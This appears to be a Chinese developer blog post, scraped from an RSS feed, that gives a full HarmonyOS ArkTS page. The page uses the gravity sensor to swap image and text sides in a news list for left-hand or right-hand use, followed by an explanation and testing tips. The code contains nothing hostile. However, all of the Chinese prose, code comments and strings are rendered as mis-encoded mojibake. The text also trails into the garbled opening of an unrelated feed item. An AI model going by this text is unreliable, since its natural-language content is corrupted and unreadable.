<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0a094fd43a24a7f87fec7d5fd8d656e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aiB5ZOl54ix57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775235&amp;x-signature=GCDYvuJye6KgaQScA9xY62BDwho%3D" alt="" loading="lazy"/></p>
<p>å‡†å¤‡å¥½ä½ çš„ DevEco Studioï¼Œæ–°å»ºä¸€ä¸ª ArkTS é¡µé¢ï¼ŒæŠŠä¸‹é¢çš„ä»£ç å…¨é€‰ã€å¤åˆ¶ã€ç²˜è´´è¿›å»ã€‚</p>
<h3 data-id="heading-2">å®Œæ•´ä»£ç æ¡ˆä¾‹</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> sensor <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos.sensor'</span>;
<span class="hljs-keyword">import</span> promptAction <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos.promptAction'</span>;

<span class="hljs-comment">// 1. å®šä¹‰æ–°é—»æ•°æ®æ¨¡å‹</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">NewsItem</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">summary</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">imageColor</span>: <span class="hljs-title class_">Color</span>; <span class="hljs-comment">// ç”¨é¢œè‰²å—ä»£æ›¿å›¾ç‰‡ï¼Œæ–¹ä¾¿æµ‹è¯•ï¼Œä¸ç”¨æ‰¾èµ„æº</span>

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span>, title: <span class="hljs-built_in">string</span>, summary: <span class="hljs-built_in">string</span>, color: Color</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">title</span> = title;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">summary</span> = summary;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">imageColor</span> = color;
  }
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">SmartGripNewsPage</span> {
  <span class="hljs-comment">// 2. çŠ¶æ€å˜é‡</span>
  <span class="hljs-comment">// isRightMode: true ä»£è¡¨å³æ‰‹æ¨¡å¼ï¼ˆå›¾åœ¨å³ï¼‰ï¼Œfalse ä»£è¡¨å·¦æ‰‹æ¨¡å¼ï¼ˆå›¾åœ¨å·¦ï¼‰</span>
  <span class="hljs-meta">@State</span> <span class="hljs-attr">isRightMode</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">true</span>;
  <span class="hljs-comment">// è®°å½•å½“å‰çš„å€¾æ–œè§’åº¦Xå€¼ï¼Œç”¨äºæ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯</span>
  <span class="hljs-meta">@State</span> <span class="hljs-attr">currentGravityX</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;

  <span class="hljs-comment">// æ¨¡æ‹Ÿæ–°é—»æ•°æ®</span>
  <span class="hljs-meta">@State</span> <span class="hljs-attr">newsList</span>: <span class="hljs-title class_">NewsItem</span>[] = [
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">NewsItem</span>(<span class="hljs-number">1</span>, <span class="hljs-string">"é¸¿è’™Nextæ­£å¼å‘å¸ƒ"</span>, <span class="hljs-string">"çº¯è¡€é¸¿è’™ä¸å†å…¼å®¹å®‰å“ï¼Œå¼€å¯ç§»åŠ¨æ“ä½œç³»ç»Ÿæ–°çºªå…ƒã€‚"</span>, <span class="hljs-title class_">Color</span>.<span class="hljs-property">Blue</span>),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">NewsItem</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"Vå“¥èŠæŠ€æœ¯"</span>, <span class="hljs-string">"æ·±åº¦è§£æArkTSè¯­è¨€ç‰¹æ€§ï¼Œå¸¦ä½ å¼¯é“è¶…è½¦ã€‚"</span>, <span class="hljs-title class_">Color</span>.<span class="hljs-property">Red</span>),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">NewsItem</span>(<span class="hljs-number">3</span>, <span class="hljs-string">"2026è¡Œä¸šå±•æœ›"</span>, <span class="hljs-string">"AIèµ›é“çˆ†å‘ï¼Œæ™®é€šç¨‹åºå‘˜å¦‚ä½•æŠ“ä½æœ€åçš„æœºä¼šï¼Ÿ"</span>, <span class="hljs-title class_">Color</span>.<span class="hljs-property">Green</span>),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">NewsItem</span>(<span class="hljs-number">4</span>, <span class="hljs-string">"SpaceXæ˜Ÿèˆ°å‘å°„"</span>, <span class="hljs-string">"é©¬æ–¯å…‹ç«æ˜Ÿæ®–æ°‘è®¡åˆ’åˆè¿‘äº†ä¸€æ­¥ï¼Œéœ‡æ’¼å…¨äººç±»ã€‚"</span>, <span class="hljs-title class_">Color</span>.<span class="hljs-property">Orange</span>),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">NewsItem</span>(<span class="hljs-number">5</span>, <span class="hljs-string">"å‘¨æœ«å»å“ªå„¿ç©"</span>, <span class="hljs-string">"å‘ç°åŸå¸‚å‘¨è¾¹çš„å°ä¼—éœ²è¥åœ°ï¼Œæ”¾æ¾èº«å¿ƒå¥½å»å¤„ã€‚"</span>, <span class="hljs-title class_">Color</span>.<span class="hljs-property">Pink</span>),
  ];

  <span class="hljs-comment">// 3. é¡µé¢åŠ è½½æ—¶å¼€å¯ä¼ æ„Ÿå™¨ç›‘å¬</span>
  <span class="hljs-title function_">aboutToAppear</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">startSensor</span>();
  }

  <span class="hljs-comment">// 4. é¡µé¢é”€æ¯æ—¶å…³é—­ä¼ æ„Ÿå™¨ï¼Œçœç”µ</span>
  <span class="hljs-title function_">aboutToDisappear</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">stopSensor</span>();
  }

  <span class="hljs-comment">// å¼€å¯ä¼ æ„Ÿå™¨é€»è¾‘</span>
  <span class="hljs-title function_">startSensor</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// ç›‘å¬é‡åŠ›ä¼ æ„Ÿå™¨ï¼Œé¢‘ç‡è®¾ç½®ä¸º UI (é€‚åˆUIäº¤äº’çš„é¢‘ç‡)</span>
      sensor.<span class="hljs-title function_">on</span>(sensor.<span class="hljs-property">SensorId</span>.<span class="hljs-property">GRAVITY</span>, <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
        <span class="hljs-comment">// data.x ä»£è¡¨ x è½´çš„é‡åŠ›åˆ†é‡</span>
        <span class="hljs-comment">// å½“æ‰‹æœºç«–å±é¢å¯¹ä½ ï¼š</span>
        <span class="hljs-comment">// æ‰‹æœºå‘å³å€¾æ–œï¼Œx &gt; 0</span>
        <span class="hljs-comment">// æ‰‹æœºå‘å·¦å€¾æ–œï¼Œx &lt; 0</span>
        
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentGravityX</span> = data.<span class="hljs-property">x</span>;

        <span class="hljs-comment">// è®¾ç½®ä¸€ä¸ªé˜ˆå€¼ï¼Œé˜²æ­¢è½»å¾®æŠ–åŠ¨å°±åˆ‡æ¢</span>
        <span class="hljs-comment">// è¿™é‡Œè®¾ç½® 1.5 ä¸ºé˜ˆå€¼ï¼Œä½ å¯ä»¥æ ¹æ®æ‰‹æ„Ÿè°ƒæ•´</span>
        <span class="hljs-keyword">if</span> (data.<span class="hljs-property">x</span> &gt; <span class="hljs-number">1.5</span>) {
          <span class="hljs-comment">// å‘å³å€¾æ–œï¼Œè®¤ä¸ºæ˜¯å³æ‰‹æ¡æŒæˆ–è€…æƒ³çœ‹å³è¾¹</span>
          <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">isRightMode</span> === <span class="hljs-literal">false</span>) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">isRightMode</span> = <span class="hljs-literal">true</span>;
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">showToast</span>(<span class="hljs-string">"æ™ºæ„Ÿåˆ‡æ¢ï¼šå³æ‰‹æ¨¡å¼"</span>);
          }
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (data.<span class="hljs-property">x</span> &lt; -<span class="hljs-number">1.5</span>) {
          <span class="hljs-comment">// å‘å·¦å€¾æ–œï¼Œè®¤ä¸ºæ˜¯å·¦æ‰‹æ¡æŒ</span>
          <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">isRightMode</span> === <span class="hljs-literal">true</span>) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">isRightMode</span> = <span class="hljs-literal">false</span>;
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">showToast</span>(<span class="hljs-string">"æ™ºæ„Ÿåˆ‡æ¢ï¼šå·¦æ‰‹æ¨¡å¼"</span>);
          }
        }
      }, { <span class="hljs-attr">interval</span>: <span class="hljs-number">100000000</span> }); <span class="hljs-comment">// 100ms ä¸€æ¬¡å›è°ƒ</span>
    } <span class="hljs-keyword">catch</span> (err) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"Vå“¥æç¤ºï¼šä¼ æ„Ÿå™¨å¯åŠ¨å¤±è´¥ï¼Œå¯èƒ½æ˜¯æ¨¡æ‹Ÿå™¨ä¸æ”¯æŒ"</span>, err);
    }
  }

  <span class="hljs-comment">// å…³é—­ä¼ æ„Ÿå™¨</span>
  <span class="hljs-title function_">stopSensor</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">try</span> {
      sensor.<span class="hljs-title function_">off</span>(sensor.<span class="hljs-property">SensorId</span>.<span class="hljs-property">GRAVITY</span>);
    } <span class="hljs-keyword">catch</span> (err) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"Vå“¥æç¤ºï¼šä¼ æ„Ÿå™¨å…³é—­å¤±è´¥"</span>, err);
    }
  }

  <span class="hljs-comment">// å°æç¤ºå¼¹çª—</span>
  <span class="hljs-title function_">showToast</span>(<span class="hljs-params">msg: <span class="hljs-built_in">string</span></span>) {
    promptAction.<span class="hljs-title function_">showToast</span>({
      <span class="hljs-attr">message</span>: msg,
      <span class="hljs-attr">duration</span>: <span class="hljs-number">1500</span>,
      <span class="hljs-attr">bottom</span>: <span class="hljs-number">100</span>
    });
  }

  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-comment">// é¡¶éƒ¨æ ‡é¢˜æ </span>
      <span class="hljs-title class_">Row</span>() {
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">"æ™ºæ„Ÿæ–°é—»"</span>)
          .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">24</span>)
          .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
        <span class="hljs-title class_">Blank</span>()
        <span class="hljs-comment">// æ˜¾ç¤ºå½“å‰æ¨¡å¼çŠ¶æ€</span>
        <span class="hljs-title class_">Text</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">isRightMode</span> ? <span class="hljs-string">"å½“å‰ï¼šå³æ‰‹æ¨¡å¼"</span> : <span class="hljs-string">"å½“å‰ï¼šå·¦æ‰‹æ¨¡å¼"</span>)
          .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">14</span>)
          .<span class="hljs-title function_">fontColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Gray</span>)
      }
      .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
      .<span class="hljs-title function_">padding</span>(<span class="hljs-number">20</span>)
      .<span class="hljs-title function_">height</span>(<span class="hljs-number">60</span>)
      .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#F1F3F5'</span>)

      <span class="hljs-comment">// è°ƒè¯•ä¿¡æ¯ï¼ˆæ­£å¼ä¸Šçº¿å¯ä»¥å»æ‰ï¼‰</span>
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`é‡åŠ›Xè½´æ„Ÿåº”å€¼: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.currentGravityX.toFixed(<span class="hljs-number">2</span>)}</span>`</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">12</span>)
        .<span class="hljs-title function_">fontColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Gray</span>)
        .<span class="hljs-title function_">margin</span>({ <span class="hljs-attr">bottom</span>: <span class="hljs-number">10</span> })

      <span class="hljs-comment">// æ–°é—»åˆ—è¡¨</span>
      <span class="hljs-title class_">List</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">15</span> }) {
        <span class="hljs-title class_">ForEach</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">newsList</span>, <span class="hljs-function">(<span class="hljs-params">item: NewsItem</span>) =&gt;</span> {
          <span class="hljs-title class_">ListItem</span>() {
            <span class="hljs-comment">// æ ¸å¿ƒå¸ƒå±€ï¼šæ ¹æ® isRightMode å†³å®šå¸ƒå±€æ–¹å‘</span>
            <span class="hljs-comment">// Direction.Ltr (Left to Right) æˆ–è€…æ˜¯ Rtl</span>
            <span class="hljs-comment">// è¿™é‡Œæˆ‘ä»¬ç”¨ Flex æˆ–è€… Row æ‰‹åŠ¨æ§åˆ¶é¡ºåºæ›´ç¨³</span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-title class_">NewsItemBuilder</span>(item)
          }
        })
      }
      .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
      .<span class="hljs-title function_">layoutWeight</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">// å æ»¡å‰©ä½™ç©ºé—´</span>
      .<span class="hljs-title function_">padding</span>({ <span class="hljs-attr">left</span>: <span class="hljs-number">15</span>, <span class="hljs-attr">right</span>: <span class="hljs-number">15</span> })
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
  }

  <span class="hljs-comment">// è‡ªå®šä¹‰æ„å»ºå‡½æ•°ï¼Œå¤„ç†å•ä¸ªæ–°é—»çš„å¸ƒå±€</span>
  <span class="hljs-meta">@Builder</span>
  <span class="hljs-title class_">NewsItemBuilder</span>(<span class="hljs-attr">item</span>: <span class="hljs-title class_">NewsItem</span>) {
    <span class="hljs-title class_">Row</span>() {
      <span class="hljs-comment">// è¿™é‡Œçš„é€»è¾‘ï¼š</span>
      <span class="hljs-comment">// å¦‚æœæ˜¯å·¦æ‰‹æ¨¡å¼(isRightMode=false)ï¼Œå›¾ç‰‡åœ¨å·¦ï¼Œæ–‡å­—åœ¨å³</span>
      <span class="hljs-comment">// å¦‚æœæ˜¯å³æ‰‹æ¨¡å¼(isRightMode=true)ï¼Œæ–‡å­—åœ¨å·¦ï¼Œå›¾ç‰‡åœ¨å³</span>
      <span class="hljs-comment">// åˆ©ç”¨ Row çš„ direction å±æ€§æˆ–è€…ç®€å•çš„ if/else æ¸²æŸ“é¡ºåº</span>

      <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">isRightMode</span>) {
        <span class="hljs-comment">// å·¦æ‰‹æ¨¡å¼ï¼šå›¾ -&gt; æ–‡</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-title class_">ImageBlock</span>(item.<span class="hljs-property">imageColor</span>)
        <span class="hljs-variable language_">this</span>.<span class="hljs-title class_">TextBlock</span>(item)
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// å³æ‰‹æ¨¡å¼ï¼šæ–‡ -&gt; å›¾</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-title class_">TextBlock</span>(item)
        <span class="hljs-variable language_">this</span>.<span class="hljs-title class_">ImageBlock</span>(item.<span class="hljs-property">imageColor</span>)
      }
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-number">100</span>)
    .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">White</span>)
    .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">10</span>)
    .<span class="hljs-title function_">shadow</span>({ <span class="hljs-attr">radius</span>: <span class="hljs-number">5</span>, <span class="hljs-attr">color</span>: <span class="hljs-number">0x1F000000</span>, <span class="hljs-attr">offsetY</span>: <span class="hljs-number">2</span> })
    .<span class="hljs-title function_">padding</span>(<span class="hljs-number">10</span>)
    <span class="hljs-comment">// æ·»åŠ ä¸€ä¸ªé¡ºæ»‘çš„åŠ¨ç”»æ•ˆæœ</span>
    .<span class="hljs-title function_">animation</span>({
      <span class="hljs-attr">duration</span>: <span class="hljs-number">300</span>,
      <span class="hljs-attr">curve</span>: <span class="hljs-title class_">Curve</span>.<span class="hljs-property">EaseInOut</span>
    })
  }

  <span class="hljs-comment">// æŠ½å–å›¾ç‰‡ç»„ä»¶</span>
  <span class="hljs-meta">@Builder</span>
  <span class="hljs-title class_">ImageBlock</span>(<span class="hljs-attr">color</span>: <span class="hljs-title class_">Color</span>) {
    <span class="hljs-comment">// æ¨¡æ‹Ÿå›¾ç‰‡</span>
    <span class="hljs-title class_">Stack</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">"å¤´å›¾"</span>)
        .<span class="hljs-title function_">fontColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">White</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">12</span>)
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-number">100</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">backgroundColor</span>(color)
    .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">8</span>)
    .<span class="hljs-title function_">margin</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">isRightMode</span> ? { <span class="hljs-attr">left</span>: <span class="hljs-number">10</span> } : { <span class="hljs-attr">right</span>: <span class="hljs-number">10</span> }) <span class="hljs-comment">// æ ¹æ®ä½ç½®ç»™é—´è·</span>
  }

  <span class="hljs-comment">// æŠ½å–æ–‡å­—ç»„ä»¶</span>
  <span class="hljs-meta">@Builder</span>
  <span class="hljs-title class_">TextBlock</span>(<span class="hljs-attr">item</span>: <span class="hljs-title class_">NewsItem</span>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(item.<span class="hljs-property">title</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">16</span>)
        .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
        .<span class="hljs-title function_">maxLines</span>(<span class="hljs-number">1</span>)
        .<span class="hljs-title function_">textOverflow</span>({ <span class="hljs-attr">overflow</span>: <span class="hljs-title class_">TextOverflow</span>.<span class="hljs-property">Ellipsis</span> })
        .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
      
      <span class="hljs-title class_">Text</span>(item.<span class="hljs-property">summary</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">14</span>)
        .<span class="hljs-title function_">fontColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Gray</span>)
        .<span class="hljs-title function_">maxLines</span>(<span class="hljs-number">2</span>)
        .<span class="hljs-title function_">textOverflow</span>({ <span class="hljs-attr">overflow</span>: <span class="hljs-title class_">TextOverflow</span>.<span class="hljs-property">Ellipsis</span> })
        .<span class="hljs-title function_">margin</span>({ <span class="hljs-attr">top</span>: <span class="hljs-number">5</span> })
        .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    }
    .<span class="hljs-title function_">layoutWeight</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">// å æ»¡å‰©ä½™å®½åº¦</span>
    .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">justifyContent</span>(<span class="hljs-title class_">FlexAlign</span>.<span class="hljs-property">Start</span>)
    .<span class="hljs-title function_">alignItems</span>(<span class="hljs-title class_">HorizontalAlign</span>.<span class="hljs-property">Start</span>)
  }
}
</code></pre>
<h3 data-id="heading-3">ä»£ç æ·±åº¦è§£æï¼ˆVå“¥æ°ç¢äº†è®²ï¼‰</h3>
<p>å…„å¼Ÿä»¬ï¼Œä»£ç è´´å®Œäº†ï¼ŒVå“¥ç»™ä½ æ‹ä¸€æ‹è¿™é‡Œçš„æ ¸å¿ƒé—¨é“ï¼Œé¢è¯•æˆ–è€…åšé¡¹ç›®çš„æ—¶å€™éƒ½èƒ½å¹ä¸€æ³¢ã€‚</p>
<p><strong>1. ä¼ æ„Ÿå™¨ç›‘å¬ (<code>sensor.on</code>)</strong>
è¿™æ˜¯æ•´ä¸ªåŠŸèƒ½çš„çµé­‚ã€‚æˆ‘ä»¬ç”¨äº† <code>sensor.SensorId.GRAVITY</code>ã€‚</p>
<ul>
<li><code>data.x</code> æ˜¯å…³é”®ã€‚å½“ä½ æ‹¿ç€æ‰‹æœºå¾€å·¦æ­ªï¼ˆåƒæ˜¯å·¦æ‰‹æ‹¿ç€æ‰‹æœºæƒ³çœ‹å·¦è¾¹å±å¹•ï¼‰æ—¶ï¼ŒXè½´ä¼šå˜è´Ÿæ•°ï¼›å¾€å³æ­ªæ—¶ï¼ŒXè½´å˜æ­£æ•°ã€‚</li>
<li>è¿™é‡Œæˆ‘åŠ äº†ä¸ª<strong>é˜ˆå€¼ 1.5</strong>ã€‚ä¸ºå•¥ï¼Ÿå¦‚æœä¸åŠ é˜ˆå€¼ï¼Œä½ çš„æ‰‹ç¨å¾®æŠ–ä¸€ä¸‹ï¼Œç•Œé¢å°±å·¦å³ä¹±è·³ï¼Œç”¨æˆ·å¾—æ°”æ­»ã€‚1.5 æ˜¯ä¸ªç»éªŒå€¼ï¼Œå¤§çº¦å€¾æ–œ 15-20 åº¦å·¦å³è§¦å‘ï¼Œæ—¢çµæ•åˆä¸ä¼šè¯¯è§¦ã€‚</li>
</ul>
<p><strong>2. çŠ¶æ€é©±åŠ¨ UI (<code>@State isRightMode</code>)</strong>
é¸¿è’™ ArkUI çš„ç²¾é«“å°±æ˜¯<strong>çŠ¶æ€é©±åŠ¨</strong>ã€‚</p>
<ul>
<li>æˆ‘ä»¬ä¸éœ€è¦å»æ‰‹åŠ¨æ¬è¿ç»„ä»¶ã€‚åªè¦æ”¹å˜ <code>isRightMode</code> è¿™ä¸ªå¸ƒå°”å€¼ï¼ŒUI å°±ä¼šè‡ªåŠ¨åˆ·æ–°ã€‚</li>
<li>é…åˆ <code>.animation</code> å±æ€§ï¼Œå½“ç»„ä»¶ä½ç½®äº’æ¢æ—¶ï¼Œä¸ä¼šç”Ÿç¡¬åœ°â€œé—ªç°â€ï¼Œè€Œæ˜¯ä¼šæœ‰ä¸€ä¸ªæ»‘åŠ¨çš„è¿‡æ¸¡æ•ˆæœï¼Œé«˜çº§æ„Ÿç«‹é©¬å°±æ¥äº†ã€‚</li>
</ul>
<p><strong>3. æ¡ä»¶æ¸²æŸ“ (<code>if/else</code>)</strong>
åœ¨ <code>NewsItemBuilder</code> é‡Œï¼ŒVå“¥ç”¨äº†ä¸€ä¸ªæœ€ç¬¨ä½†æœ€æœ‰æ•ˆçš„æ–¹æ³•ï¼š</p>
<ul>
<li>å¦‚æœæ˜¯å·¦æ‰‹æ¨¡å¼ï¼šå…ˆæ¸²æŸ“å›¾ç‰‡ç»„ä»¶ï¼Œå†æ¸²æŸ“æ–‡å­—ç»„ä»¶ã€‚</li>
<li>å¦‚æœæ˜¯å³æ‰‹æ¨¡å¼ï¼šå…ˆæ¸²æŸ“æ–‡å­—ç»„ä»¶ï¼Œå†æ¸²æŸ“å›¾ç‰‡ç»„ä»¶ã€‚</li>
<li>å› ä¸ºæ˜¯åœ¨ <code>Row</code> å®¹å™¨é‡Œï¼Œæ¸²æŸ“é¡ºåºç›´æ¥å†³å®šäº†è°åœ¨å·¦è°åœ¨å³ã€‚</li>
</ul>
<h3 data-id="heading-4">æ€ä¹ˆæµ‹è¯•ï¼Ÿ</h3>
<ol>
<li><strong>çœŸæœºæµ‹è¯•ï¼ˆæ¨èï¼‰</strong>ï¼šæŠŠä»£ç çƒ§å½•åˆ°é¸¿è’™æ‰‹æœºä¸Šã€‚æ‹¿ç€æ‰‹æœºå‘å·¦å€¾æ–œä¸€ä¸‹ï¼Œä½ ä¼šå‘ç°å›¾ç‰‡â€œåˆ·â€ä¸€ä¸‹è·‘åˆ°å·¦è¾¹äº†ï¼›å‘å³å€¾æ–œä¸€ä¸‹ï¼Œå›¾ç‰‡åˆè·‘å›å³è¾¹äº†ã€‚</li>
<li><strong>æ¨¡æ‹Ÿå™¨æµ‹è¯•</strong>ï¼šDevEco Studio çš„æ¨¡æ‹Ÿå™¨é€šå¸¸æœ‰ä¸ªâ€œè™šæ‹Ÿä¼ æ„Ÿå™¨â€é¢æ¿ã€‚ä½ å¯ä»¥æ‰‹åŠ¨æ‹–åŠ¨é‡åŠ›ä¼ æ„Ÿå™¨çš„ X è½´æ»‘å—ï¼Œæ¨¡æ‹Ÿæ‰‹æœºå€¾æ–œï¼Œçœ‹ç•Œé¢ä¼šä¸ä¼šå˜ã€‚</li>
</ol>
<h3 data-id="heading-5">Vå“¥çš„æœ€åå” å¨</h3>
<p>å…„å¼Ÿä»¬ï¼Œè¿™ä¸ªåŠŸèƒ½è™½ç„¶ä»£ç ä¸å¤šï¼Œä½†ä½“ç°çš„æ˜¯<strong>ä»¥äººä¸ºæœ¬</strong>çš„è®¾è®¡æ€ç»´ã€‚</p>
<p>è¿™å°±æ˜¯é¸¿è’™ Next å¼€å‘å¥½ç©çš„åœ°æ–¹ï¼Œç¡¬ä»¶èƒ½åŠ›è°ƒç”¨æå…¶ç®€å•ã€‚2026å¹´ï¼Œä¸ç®¡æ˜¯åšåº”ç”¨è¿˜æ˜¯åšç³»ç»Ÿï¼Œ<strong>äº¤äº’ä½“éªŒ</strong>æ°¸è¿œæ˜¯æ ¸å¿ƒç«äº‰åŠ›ã€‚</p>
<p>èµ¶ç´§æŠŠè¿™ä»£ç è·‘èµ·æ¥ï¼Œä»¥åè€æ¿è®©ä½ åšâ€œé€‚è€åŒ–â€æˆ–è€…â€œå•æ‰‹æ¨¡å¼â€ï¼Œä½ æŠŠè¿™ä¸ª Demo ä¸€äº®ï¼Œç»å¯¹æƒŠè‰³å…¨åœºï¼ç¥å¤§å®¶å‘ç æ„‰å¿«ï¼Œæ²¡æœ‰ Bugï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ˜¥å“¥çš„Agenté€šå…³ç§˜ç±04ï¼šæ™ºèƒ½è®°è´¦å°ç§˜ä¹¦ã€å®æˆ˜ç¯‡ã€‘]]></title>    <link>https://juejin.cn/post/7602454700504055849</link>    <guid>https://juejin.cn/post/7602454700504055849</guid>    <pubDate>2026-02-04T00:16:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602454700504055849" data-draft-id="7602472997921095680" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ˜¥å“¥çš„Agenté€šå…³ç§˜ç±04ï¼šæ™ºèƒ½è®°è´¦å°ç§˜ä¹¦ã€å®æˆ˜ç¯‡ã€‘"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-02-04T00:16:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ‘¸é±¼çš„æ˜¥å“¥"/> <meta itemprop="url" content="https://juejin.cn/user/1714893870865303"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ˜¥å“¥çš„Agenté€šå…³ç§˜ç±04ï¼šæ™ºèƒ½è®°è´¦å°ç§˜ä¹¦ã€å®æˆ˜ç¯‡ã€‘
